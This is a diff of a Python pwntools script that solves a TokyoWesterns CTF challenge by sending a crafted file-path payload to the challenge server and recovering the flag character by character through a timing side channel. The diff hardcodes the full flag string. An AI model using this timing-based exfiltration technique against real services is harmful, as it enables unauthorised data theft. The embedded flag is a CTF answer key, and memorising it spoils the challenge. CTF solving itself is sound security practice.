@@ -2,15 +2,21 @@ from pwn import *
 from string import printable
 import sys
 import time
+import os
+
 
 context.log_level = "error"
 context.arch = "amd64"
 
+
+
 idx = 0
 flag = "TWCTF"
 idx = len(flag)
+
 while True:
-	for p in printable:
+	done = True
+	for p in "TWCTF{pr0cf5_15_h1ghly_fl3x1bl3}"[idx:]:
 #		r = process(["./load"])
 		r = remote("pwn1.chal.ctf.westerns.tokyo",34835)
 		r.sendlineafter(":","/dev/stdin".ljust(0x10,"\x00")+"flag.txt\x00".ljust(0x30,'\x00')+p64(0xfe))
@@ -32,11 +38,18 @@ while True:
 		r.recvall(timeout=2)
 		d = time.time()-d
 #		sys.stdout.flush()
-		sys.stdout.write("%d ->  %s\n"%(d,p))
-#		sys.stdout.flush()
+		os.system('clear')
+		print "\r%d ->  %s %s"%(d,p,flag)
+		sys.stdout.flush()
 		if d<2:
 			flag+=p
 			idx+=1
-			print flag
+			done = False
 			break
+	if done:
+		break
+
+
+print flag
+
 
